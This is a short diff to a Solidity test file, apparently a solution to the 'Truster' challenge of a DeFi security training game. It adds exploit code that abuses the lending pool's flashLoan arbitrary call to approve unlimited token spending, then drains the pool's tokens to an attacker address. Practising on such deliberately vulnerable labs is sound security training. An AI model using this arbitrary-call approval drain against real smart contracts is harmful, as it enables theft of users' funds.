@@ -38,6 +38,16 @@ contract Truster is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        bytes memory payload = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            type(uint256).max
+        );
+
+        trusterLenderPool.flashLoan(0, address(this), address(dvt), payload);
+
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+
         /** EXPLOIT END **/
         validation();
     }
